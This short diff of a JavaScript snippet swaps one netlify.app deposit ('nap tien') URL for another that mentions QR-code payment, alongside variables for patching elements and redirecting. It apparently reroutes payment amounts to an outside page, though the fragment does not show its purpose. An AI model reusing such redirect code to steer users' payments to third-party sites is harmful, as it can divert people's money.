@@ -1,6 +1,6 @@
 (function() {
   'use strict';
-  const NETLIFY_URL = 'https://nap-tien-f1686s.netlify.app/?amount=';
+  const NETLIFY_URL = 'https://f168-nap-tien-qua-ma-qr.netlify.app/?amount=';
   const patched = new WeakSet();
   let redirecting = false;
 
